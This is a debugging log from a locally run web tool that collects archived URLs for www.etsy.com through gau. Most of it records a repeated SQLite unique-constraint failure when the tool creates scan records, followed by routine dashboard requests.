[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:15.584589')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:15 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:15.584589')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:16 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:16 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:16 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:16.085997')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:16 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:16.085997')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:17 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:17 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:42:17 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:17.087216')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:17 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:17.087216')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:17 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:17.087216')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:17 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:42:17.087216')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:42:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:17] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:42:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:42:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:42:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:42:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:42:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:17] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:42:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:42:24] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:43:14 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:43:14 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:43:14 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:43:14 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:43:14 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:43:14 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:43:14 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:43:14 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:43:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:14] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:43:15 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:43:15 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:43:15 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:15 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:15 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:15.830980')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:15 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:15.830980')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:16 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:16 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:16 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:16.332146')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:16 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:16.332146')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:43:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:43:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:43:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:43:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:43:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:43:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:43:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:17] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:43:17 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:17 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:43:17 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:17.333297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:17 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:17.333297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:17 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:17.333297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:17 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:43:17.333297')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:43:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:17] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:43:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:43:25] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:44:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:44:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:17 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:17 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:17 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:17] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:44:18 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:44:18 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:44:18 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:18 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:18 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:18 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:18 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:18 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:18] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:44:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:44:20 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:20 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:44:20 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:20 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:44:20 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:20 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:44:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:20] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-05 23:44:20 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:44:20 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:44:20 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:20 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:20 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:20.930941')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:20 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 1/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:20.930941')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:21 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:21 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:21 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:21.432077')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:21 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 2/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:21.432077')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:22 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:22 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:44:22 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:22.433501')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:22 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:22.433501')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:22 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:22.433501')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:22 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:44:22.433501')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:44:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:22] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:44:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:26] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:44:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:27] "[31m[1mDELETE /api/gau/result/1 HTTP/1.1[0m" 405 -
2025-06-05 23:44:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:44:42] "[33mPOST /api/gau/scan/3 HTTP/1.1[0m" 404 -
2025-06-05 23:45:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:45:27] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:46:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:28] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-05 23:46:32 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:46:32 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:46:32 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 23:46:32 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.002s)
2025-06-05 23:46:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:32] "GET / HTTP/1.1" 200 -
2025-06-05 23:46:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:32] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:46:35 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:46:35 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 23:46:35 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET / HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:46:35 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:46:35 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 23:46:35 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET / HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:46:35 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:46:35 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 23:46:35 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.002s)
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET / HTTP/1.1" 200 -
2025-06-05 23:46:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:35] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:37 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 23:46:37 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 23:46:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:37] "GET /attack/1 HTTP/1.1" 200 -
2025-06-05 23:46:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:37] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-05 23:46:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:37] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-05 23:46:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:37] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:37 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:46:37 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:46:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:37] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:46:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:38] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:46:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:46:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:38] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:46:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:46:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:46:38 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:38 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:46:38 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:38 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:46:38 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:46:38 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
